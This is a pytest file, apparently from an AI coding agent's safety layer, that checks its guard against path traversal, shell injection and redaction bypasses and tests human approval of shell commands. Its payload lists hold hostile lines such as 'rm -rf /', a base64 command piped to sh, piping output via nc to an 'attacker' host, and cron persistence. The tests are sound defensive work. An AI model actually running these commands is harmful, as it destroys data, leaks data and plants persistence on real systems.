"""安全边界测试:参数校验 / 隔离 / HITL / 去重 / 脱敏。"""
from __future__ import annotations

import os

import pytest

from mycoder.safety import (
    AllowAllProvider,
    CallbackProvider,
    DenyAllProvider,
    Redactor,
    SafetyGuard,
    validate_params,
)
from mycoder.tools import build_registry
from mycoder.tools.sandbox import PathEscapeError

# Eval Hardening Plan §6:真实路径遍历 payload 样本。URL 编码和 Unicode 变体的
# 不变量是 fail-closed:guard 拒绝，或者 Workspace.resolve 的最终路径仍留在 root。
PATH_TRAVERSAL_PAYLOADS = [
    "../secret.txt", "a/../../evil.txt", "..%2fsecret.txt", "%2e%2e%2fsecret.txt",
    "..%c0%afsecret.txt", "....//....//secret.txt", "..\\..\\secret.txt",
    "..%5c..%5csecret.txt", "/etc/passwd", "C:\\Windows\\system32\\config\\SAM",
    "\\\\server\\share\\file", "file.txt\x00../secret.txt", "./a/./b/../../secret.txt",
    "." * 260 + "/x.txt", "．．/secret.txt",
]

# 这些字符串永不执行:只送入 SafetyGuard 判断。部分变体会通过白名单但必须仍需
# HITL;用 DenyAllProvider 验证审批层不会放行。
SHELL_INJECTION_PAYLOADS = [
    "echo safe; rm -rf /", "echo $(rm -rf /)", "echo `rm -rf /`",
    "echo safe && rm -rf /", "echo safe\r\nrm -rf /", "rm${IFS}-rf${IFS}/",
    "ec\\ho hi", "echo cm0gLXJmIC8=|base64 -d|sh", "echo hi | nc attacker 4444",
    "echo hi > /etc/cron.d/persist",
]

REDACT_BYPASS_PAYLOADS = [
    ("key=sk-abcdefghijklmnopqrstuvwxyz", "sk-abcdefghijklmnopqrstuvwxyz"),
    ("key = sk-abcdefghijklmnopqrstuvwxyz", "sk-abcdefghijklmnopqrstuvwxyz"),
    ("KEY:sk-abcdefghijklmnopqrstuvwxyz", "sk-abcdefghijklmnopqrstuvwxyz"),
    ("sk-abcdefghijklmnopqrstuvwxyz\n", "sk-abcdefghijklmnopqrstuvwxyz"),
    ("Authorization: Bearer SECRETTOKEN", "SECRETTOKEN"),
    ("password=supersecret123", "supersecret123"),
    ("secret : line-secret-987", "line-secret-987"),
    ("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----", "AAAA"),
]


@pytest.fixture
def guard(config, workspace):
    return SafetyGuard(config, workspace,
                       approver=AllowAllProvider(),
                       redactor=Redactor(enabled=False))


@pytest.fixture
def tools():
    return build_registry()


class TestParamValidation:
    @pytest.mark.parametrize("tool,params,expect_ok", [
        ("file_read", {"path": "a.py"}, True),
        ("file_read", {}, False),
        ("file_read", {"path": "a.py", "bogus": 1}, False),
        ("file_read", {"path": "a.py", "offset": "x"}, False),
        ("memory_query", {"query": "q", "kind": "file"}, True),
        ("memory_query", {"query": "q", "kind": "nope"}, False),
        ("file_read", {"path": "a.py", "offset": -5}, False),
        ("file_read", {"path": "a.py", "limit": 0}, False),
        ("file_edit", {"path": "a.py", "old_string": "x"}, False),
    ])
    def test_guard_validation(self, guard, tools, tool, params, expect_ok):
        gr = guard.check(tools.get(tool), params)
        assert gr.allowed is expect_ok, gr.reason
        if not expect_ok:
            assert gr.reason

    def test_validate_params_direct(self):
        schema = {"type": "object",
                  "properties": {"n": {"type": "integer", "minimum": 0}},
                  "required": ["n"]}
        assert validate_params(schema, {"n": 1}) == []
        assert validate_params(schema, {}) != []
        assert validate_params(schema, {"n": -1}) != []


class TestIsolation:
    @pytest.mark.parametrize("tool,params", [
        ("file_read", {"path": "../secret.txt"}),
        ("file_write", {"path": "a/../../evil.txt", "content": "x"}),
        ("shell_exec", {"command": "echo hi", "cwd": ".."}),
        ("grep_search", {"pattern": "x", "path": "../etc"}),
    ])
    def test_escape_blocked(self, guard, tools, tool, params):
        gr = guard.check(tools.get(tool), params)
        assert not gr.allowed and "逃逸" in gr.reason

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_payloads_fail_closed(self, guard, tools, workspace, payload):
        gr = guard.check(tools.get("file_read"), {"path": payload})
        if not gr.allowed:
            assert gr.reason
            return
        # 编码/全角路径未在当前输入层解码时，仍不得被 resolve 到工作区之外。
        try:
            resolved = workspace.resolve(payload)
        except (PathEscapeError, ValueError, OSError):
            return
        assert os.path.commonpath([str(workspace.root), str(resolved)]) == str(workspace.root)

    def test_symlink_escape_is_blocked(self, guard, tools, workspace, tmp_path):
        outside = tmp_path / "outside-secret.txt"
        outside.write_text("outside", encoding="utf-8")
        link = workspace.root / "outside-link.txt"
        try:
            link.symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("当前 Windows 环境不允许创建符号链接")
        gr = guard.check(tools.get("file_read"), {"path": "outside-link.txt"})
        assert not gr.allowed and "逃逸" in gr.reason


class TestShellPolicy:
    def test_not_in_allowlist(self, guard, tools):
        gr = guard.check(tools.get("shell_exec"), {"command": "powershell -c x"})
        assert not gr.allowed and "白名单" in gr.reason

    def test_deny_pattern(self, guard, tools):
        gr = guard.check(tools.get("shell_exec"), {"command": "echo safe; rm -rf /"})
        assert not gr.allowed and "高危" in gr.reason

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_shell_payload_is_blocked_or_requires_hitl(self, guard, tools, payload):
        gr = guard.check(tools.get("shell_exec"), {"command": payload})
        assert not gr.allowed or gr.needs_approval

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_shell_payload_cannot_pass_denied_approval(self, config, workspace, tools, payload):
        g = SafetyGuard(config, workspace, approver=DenyAllProvider())
        gr = g.check(tools.get("shell_exec"), {"command": payload})
        assert not gr.allowed or not g.approve(gr.action)

    def test_allowlist_ok_needs_approval(self, guard, tools):
        gr = guard.check(tools.get("shell_exec"), {"command": "echo hi"})
        assert gr.allowed and gr.needs_approval

    def test_empty_command(self, guard, tools):
        gr = guard.check(tools.get("shell_exec"), {"command": "  "})
        assert not gr.allowed


class TestHitl:
    def test_deny_provider_blocks(self, config, workspace, tools):
        g = SafetyGuard(config, workspace, approver=DenyAllProvider())
        gr = g.check(tools.get("shell_exec"), {"command": "echo x"})
        assert gr.allowed and gr.needs_approval
        assert not g._approver.approve(gr.action)

    def test_callback_provider(self, config, workspace):
        g = SafetyGuard(config, workspace,
                        approver=CallbackProvider(lambda a: a["tool"] == "shell_exec"))
        assert g._approver.approve({"tool": "shell_exec"})
        assert not g._approver.approve({"tool": "file_write"})

    def test_safe_tool_no_approval(self, guard, tools):
        gr = guard.check(tools.get("file_read"), {"path": "a.py"})
        assert not gr.needs_approval


class TestDedup:
    def test_repeated_read_shortcircuits(self, guard, tools, workspace):
        workspace.write_text("d.py", "content")
        g1 = guard.check(tools.get("file_read"), {"path": "d.py"})
        assert g1.cached_output is None
        guard.record_executed(tools.get("file_read"), {"path": "d.py"}, "content")
        g2 = guard.check(tools.get("file_read"), {"path": "d.py"})
        assert g2.cached_output == "content"
        assert guard.read_cache_hits == 1

    def test_repeated_write_flagged(self, guard, tools):
        guard.record_executed(tools.get("file_write"), {"path": "w.py", "content": "x"}, "ok")
        g2 = guard.check(tools.get("file_write"), {"path": "w.py", "content": "x"})
        assert g2.cached_output == "ok"
        assert guard.skipped_repeats == 1

    def test_different_args_no_dedup(self, guard, tools):
        guard.record_executed(tools.get("file_read"), {"path": "a.py"}, "A")
        g2 = guard.check(tools.get("file_read"), {"path": "b.py"})
        assert g2.cached_output is None


class TestRedact:
    @pytest.mark.parametrize("payload,secret", REDACT_BYPASS_PAYLOADS)
    def test_redactor_bypass_variants(self, payload, secret):
        out = Redactor().redact(payload)
        assert secret not in out

    def test_disabled(self):
        r = Redactor(enabled=False)
        assert r.redact("sk-abcdefghijklmnopqrstuvwxyz") == "sk-abcdefghijklmnopqrstuvwxyz"

    def test_payload_library_size(self):
        # 15 path + 10 shell + 8 redactor + 9 parameter cases = 42 个安全样本。
        assert len(PATH_TRAVERSAL_PAYLOADS) + len(SHELL_INJECTION_PAYLOADS) \
               + len(REDACT_BYPASS_PAYLOADS) + 9 >= 40
